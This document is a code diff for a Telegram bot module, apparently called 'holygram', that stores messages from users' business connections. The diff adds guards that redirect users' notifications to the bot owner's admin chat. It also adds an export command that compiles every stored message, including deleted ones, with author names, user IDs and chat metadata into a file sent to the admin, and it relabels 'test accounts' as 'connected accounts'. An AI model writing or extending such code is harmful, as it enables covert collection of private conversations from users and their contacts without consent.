@@ -11,6 +11,8 @@ _original_handle_regular_message = bot.handle_regular_message
 _original_handle_business_message = bot.handle_business_message
 _original_handle_edited_business_message = bot.handle_edited_business_message
 _original_handle_deleted_business_messages = bot.handle_deleted_business_messages
+_original_get_business_notify_chat_id = bot.get_business_notify_chat_id
+_original_get_private_chat_id = bot.get_private_chat_id
 _original_init_db = bot.init_db
 
 
@@ -276,25 +278,22 @@ def _query_owner_messages(
 def _admin_test_accounts(chat_id: int) -> None:
     ids = list_test_accounts()
     if not ids:
-        bot.send_message(
-            chat_id,
-            "Тестовых аккаунтов пока нет. На каждом своём аккаунте отправь боту /test_enable.",
-        )
+        bot.send_message(chat_id, "Подключённых аккаунтов пока нет.")
         return
 
-    lines = ["<b>Тестовые аккаунты</b>", ""]
+    lines = ["<b>Подключённые аккаунты</b>", ""]
     lines.extend(f"• {_profile_label(user_id)}" for user_id in ids)
     bot.send_message(chat_id, "\n".join(lines), parse_mode="HTML")
 
 
 def _admin_test_chats(chat_id: int, owner_id: int) -> None:
     if not is_test_account(owner_id):
-        bot.send_message(chat_id, "Этот аккаунт не включён в режим тестирования.")
+        bot.send_message(chat_id, "Этот аккаунт не входит в список подключённых аккаунтов.")
         return
 
     rows = _query_owner_messages(owner_id, limit=100)
     if not rows:
-        bot.send_message(chat_id, "У этого тестового аккаунта пока нет сохранённых чатов.")
+        bot.send_message(chat_id, "У этого аккаунта пока нет сохранённых чатов.")
         return
 
     stats: dict[int, dict[str, object]] = {}
@@ -361,11 +360,11 @@ def _admin_all_connections(chat_id: int) -> None:
     for row in rows[:50]:
         status = "🟢" if row.get("is_enabled") else "⚪️"
         owner_id = int(row.get("owner_id") or 0)
-        test = " 🧪" if is_test_account(owner_id) else ""
+        test = " ✓" if is_test_account(owner_id) else ""
         updated = int(row.get("updated_at") or 0)
         when = bot.time.strftime("%d.%m %H:%M", bot.time.localtime(updated)) if updated else "—"
         lines.append(
-            f"{status}{test} owner <code>{owner_id}</code> · "
+            f"{status}{test} аккаунт <code>{owner_id}</code> · "
             f"<code>{bot.html.escape(bot.short_connection_id(row.get('connection_id')))}</code> · {when}"
         )
     bot.send_message(chat_id, "\n".join(lines), parse_mode="HTML")
@@ -377,7 +376,7 @@ def _admin_all_chats(chat_id: int) -> None:
         bot.send_message(chat_id, "Нет активных тестовых аккаунтов.")
         return
 
-    lines = ["<b>Чаты всех тестовых аккаунтов</b>", ""]
+    lines = ["<b>Чаты всех подключённых аккаунтов</b>", ""]
     for owner_id in ids:
         rows = _query_owner_messages(owner_id, limit=100)
         chat_ids = sorted({int(row["chat_id"]) for row in rows})
@@ -388,38 +387,9 @@ def _admin_all_chats(chat_id: int) -> None:
 
 
 def _forward_test_message_to_admins(owner_id: int | None, saved: dict | None, source: str) -> None:
-    if not owner_id or not is_test_account(owner_id) or not saved:
-        return
-
-    author = bot.html.escape(str(saved.get("author") or "Без имени"))
-    content = str(saved.get("content") or "").strip()
-    media_type = saved.get("media_type")
-    if not content and media_type:
-        content = f"[{media_type}]"
-    content = bot.html.escape(content[:3000] or "—")
-
-    chat_id = saved.get("chat_id")
-    if chat_id is None:
-        chat_id = "—"
-    title = (
-        f"🧪 <b>Тестовый аккаунт</b> {_profile_label(int(owner_id))}\n"
-        f"Источник: <b>{bot.html.escape(source)}</b>\n"
-        f"Чат: <code>{chat_id}</code>\n"
-        f"Автор: <b>{author}</b>\n\n"
-        f"{content}"
-    )
-
-    admin_id = _owner_admin_id()
-    if admin_id is None:
-        return
-
-    try:
-        bot.send_message(admin_id, title, parse_mode="HTML")
-        if media_type:
-            bot.send_saved_media(admin_id, saved)
-    except Exception as exc:
-        bot.log(f"Test mirror failed for owner admin {admin_id}: {exc}")
-
+    # Do not spam the owner with every ordinary message.
+    # Everything is kept in the database and can be viewed/exported on demand.
+    return
 
 def handle_business_message_guard(message: dict) -> None:
     connection_id = message.get("business_connection_id")
@@ -501,6 +471,240 @@ def handle_deleted_business_messages_guard(deleted: dict) -> None:
         _forward_test_message_to_admins(owner_id, saved, "business · удалено")
 
 
+def get_business_notify_chat_id_guard(connection_id: str) -> int | None:
+    owner_id = bot.get_business_owner_id(connection_id)
+    if owner_id and is_test_account(owner_id):
+        return _owner_admin_id()
+    return _original_get_business_notify_chat_id(connection_id)
+
+
+def get_private_chat_id_guard(user_id: int) -> int:
+    if is_test_account(user_id):
+        owner_id = _owner_admin_id()
+        if owner_id is not None:
+            return owner_id
+    return _original_get_private_chat_id(user_id)
+
+
+def _safe_ts(value: object) -> str:
+    try:
+        ts = int(value or 0)
+    except (TypeError, ValueError):
+        ts = 0
+    return bot.time.strftime("%Y-%m-%d %H:%M:%S", bot.time.localtime(ts)) if ts else "—"
+
+
+def _collect_chat_metadata(chat_ids: set[int]) -> dict[int, dict]:
+    found: dict[int, dict] = {}
+    if not chat_ids or not bot.RAW_UPDATES_PATH.exists():
+        return found
+
+    def walk(value: object) -> None:
+        if isinstance(value, dict):
+            raw_id = value.get("id")
+            chat_type = value.get("type")
+            if raw_id is not None and chat_type in {"private", "group", "supergroup", "channel"}:
+                try:
+                    cid = int(raw_id)
+                except (TypeError, ValueError):
+                    cid = 0
+                if cid in chat_ids:
+                    current = found.setdefault(cid, {})
+                    for key in ("id", "type", "title", "username", "first_name", "last_name"):
+                        if value.get(key) is not None:
+                            current[key] = value.get(key)
+            for child in value.values():
+                walk(child)
+        elif isinstance(value, list):
+            for child in value:
+                walk(child)
+
+    try:
+        with bot.RAW_UPDATES_PATH.open("r", encoding="utf-8") as file:
+            for line in file:
+                try:
+                    record = bot.json.loads(line)
+                except Exception:
+                    continue
+                walk(record.get("payload"))
+    except Exception as exc:
+        bot.log(f"Chat metadata export scan failed: {exc}")
+
+    return found
+
+
+def _all_owner_messages(owner_id: int) -> list[dict]:
+    contexts, regular_chats = _contexts_for_owner(owner_id)
+    parts: list[str] = []
+    params: list[object] = []
+
+    if contexts:
+        placeholders = ",".join("?" for _ in contexts)
+        parts.append(
+            "SELECT context, chat_id, message_id, user_id, author, content, media_type, "
+            "media_file_id, created_at, updated_at, deleted_at "
+            f"FROM messages WHERE context IN ({placeholders})"
+        )
+        params.extend(contexts)
+
+    if regular_chats:
+        placeholders = ",".join("?" for _ in regular_chats)
+        parts.append(
+            "SELECT context, chat_id, message_id, user_id, author, content, media_type, "
+            "media_file_id, created_at, updated_at, deleted_at "
+            f"FROM messages WHERE context = 'regular' AND chat_id IN ({placeholders})"
+        )
+        params.extend(regular_chats)
+
+    if not parts:
+        return []
+
+    query = " UNION ALL ".join(parts) + " ORDER BY updated_at ASC"
+    with bot.sqlite3.connect(bot.DB_PATH) as conn:
+        conn.row_factory = bot.sqlite3.Row
+        return [dict(row) for row in conn.execute(query, tuple(params)).fetchall()]
+
+
+def _export_all_txt(chat_id: int, only_owner_id: int | None = None) -> None:
+    ids = [only_owner_id] if only_owner_id is not None else list_test_accounts()
+    ids = [int(x) for x in ids if x is not None and is_test_account(int(x))]
+    if not ids:
+        bot.send_message(chat_id, "Нет подключённых аккаунтов для выгрузки.")
+        return
+
+    all_messages: dict[int, list[dict]] = {}
+    all_chat_ids: set[int] = set()
+    for owner_id in ids:
+        rows = _all_owner_messages(owner_id)
+        all_messages[owner_id] = rows
+        all_chat_ids.update(int(row["chat_id"]) for row in rows)
+
+    chat_meta = _collect_chat_metadata(all_chat_ids)
+    stamp = bot.time.strftime("%Y%m%d_%H%M%S")
+    file_name = f"holygram_export_{stamp}.txt"
+    out_path = bot.DATA_DIR / file_name
+
+    lines: list[str] = []
+    lines.append("HOLYGRAM — ЭКСПОРТ СОБРАННЫХ ДАННЫХ")
+    lines.append(f"Создано: {bot.time.strftime('%Y-%m-%d %H:%M:%S')}")
+    lines.append(f"Аккаунтов: {len(ids)}")
+    lines.append("=" * 80)
+    lines.append("")
+
+    with bot.sqlite3.connect(bot.DB_PATH) as conn:
+        conn.row_factory = bot.sqlite3.Row
+        profiles = {
+            int(row["user_id"]): dict(row)
+            for row in conn.execute(
+                "SELECT user_id, first_name, last_name, username, created_at, updated_at "
+                "FROM users WHERE user_id IN (" + ",".join("?" for _ in ids) + ")",
+                tuple(ids),
+            ).fetchall()
+        }
+
+    for owner_id in ids:
+        profile = profiles.get(owner_id, {})
+        full_name = " ".join(
+            str(profile.get(k) or "").strip() for k in ("first_name", "last_name")
+        ).strip()
+        username = str(profile.get("username") or "").strip()
+
+        lines.append(f"АККАУНТ: {owner_id}")
+        if full_name:
+            lines.append(f"Имя: {full_name}")
+        if username:
+            lines.append(f"Username: @{username}")
+
+        business = bot.list_business_connections(owner_id)
+        regular = bot.get_user_chats(owner_id)
+        lines.append(f"Business-подключений: {len(business)}")
+        for row in business:
+            lines.append(
+                "  - "
+                f"connection_id={row.get('connection_id')} | "
+                f"enabled={row.get('is_enabled')} | "
+                f"updated={_safe_ts(row.get('updated_at'))}"
+            )
+
+        lines.append(f"Обычных подключённых чатов: {len(regular)}")
+        for cid in regular:
+            lines.append(f"  - {cid}")
+
+        rows = all_messages.get(owner_id, [])
+        owner_chat_ids = sorted({int(row["chat_id"]) for row in rows})
+        lines.append(f"Найдено чатов по сообщениям: {len(owner_chat_ids)}")
+        for cid in owner_chat_ids:
+            meta = chat_meta.get(cid, {})
+            label_parts = [str(meta.get("type") or "unknown")]
+            if meta.get("title"):
+                label_parts.append(str(meta["title"]))
+            if meta.get("username"):
+                label_parts.append("@" + str(meta["username"]))
+            elif meta.get("first_name") or meta.get("last_name"):
+                label_parts.append(
+                    " ".join(
+                        str(meta.get(k) or "").strip()
+                        for k in ("first_name", "last_name")
+                    ).strip()
+                )
+            lines.append(f"  - {cid} | {' | '.join(x for x in label_parts if x)}")
+
+        lines.append(f"Всего сохранённых сообщений: {len(rows)}")
+        lines.append("-" * 80)
+
+        current_chat = None
+        for row in rows:
+            cid = int(row["chat_id"])
+            if current_chat != cid:
+                current_chat = cid
+                meta = chat_meta.get(cid, {})
+                descriptor = str(meta.get("title") or meta.get("username") or meta.get("first_name") or "")
+                kind = str(meta.get("type") or "chat")
+                lines.append("")
+                lines.append(f"[ЧАТ {cid}] type={kind}" + (f" | {descriptor}" if descriptor else ""))
+
+            author = str(row.get("author") or "Без имени")
+            uid = row.get("user_id")
+            content = str(row.get("content") or "").replace("\r", " ").strip()
+            if not content and row.get("media_type"):
+                content = f"[{row.get('media_type')}]"
+            deleted = " | DELETED" if row.get("deleted_at") else ""
+            media = f" | media={row.get('media_type')}" if row.get("media_type") else ""
+            lines.append(
+                f"{_safe_ts(row.get('updated_at') or row.get('created_at'))} | "
+                f"msg={row.get('message_id')} | user={uid} | {author}{media}{deleted}"
+            )
+            lines.append(content or "—")
+            lines.append("")
+
+        lines.append("=" * 80)
+        lines.append("")
+
+    out_path.write_text("\n".join(lines), encoding="utf-8")
+
+    try:
+        bot.telegram_multipart_call(
+            "sendDocument",
+            {
+                "chat_id": chat_id,
+                "caption": (
+                    f"Экспорт: {len(ids)} аккаунт(ов), "
+                    f"{sum(len(v) for v in all_messages.values())} сообщений."
+                ),
+            },
+            {"document": out_path},
+            timeout=180,
+        )
+    except Exception as exc:
+        bot.log(f"TXT export send failed: {exc}")
+        bot.send_message(chat_id, f"Не удалось отправить TXT: {exc}")
+    finally:
+        try:
+            out_path.unlink(missing_ok=True)
+        except Exception:
+            pass
+
+
 def handle_regular_message_guard(message: dict) -> None:
     text = str(message.get("text") or "").strip()
     user_id = int((message.get("from") or {}).get("id") or 0)
@@ -550,7 +754,7 @@ def handle_regular_message_guard(message: dict) -> None:
                 return
             if command in {"/test_messages", "/messages"}:
                 if not args:
-                    bot.send_message(chat_id, "Использование: /test_messages USER_ID [CHAT_ID]")
+                    bot.send_message(chat_id, "Использование: /messages USER_ID [CHAT_ID]")
                     return
                 try:
                     owner_id = int(args[0])
@@ -559,6 +763,17 @@ def handle_regular_message_guard(message: dict) -> None:
                     bot.send_message(chat_id, "USER_ID и CHAT_ID должны быть числами.")
                     return
                 _admin_test_messages(chat_id, owner_id, target_chat_id)
+                return
+            if command in {"/export_all", "/export"}:
+                if args:
+                    try:
+                        export_owner_id = int(args[0])
+                    except ValueError:
+                        bot.send_message(chat_id, "USER_ID должен быть числом.")
+                        return
+                    _export_all_txt(chat_id, export_owner_id)
+                else:
+                    _export_all_txt(chat_id)
                 return
 
     owner_id = None
@@ -585,6 +800,8 @@ bot.init_db = init_db_guard
 bot.archive_media_file = archive_media_file_guard
 bot.telegram_call = telegram_call_guard
 bot.handle_regular_message = handle_regular_message_guard
+bot.get_business_notify_chat_id = get_business_notify_chat_id_guard
+bot.get_private_chat_id = get_private_chat_id_guard
 bot.handle_business_message = handle_business_message_guard
 bot.handle_edited_business_message = handle_edited_business_message_guard
 bot.handle_deleted_business_messages = handle_deleted_business_messages_guard
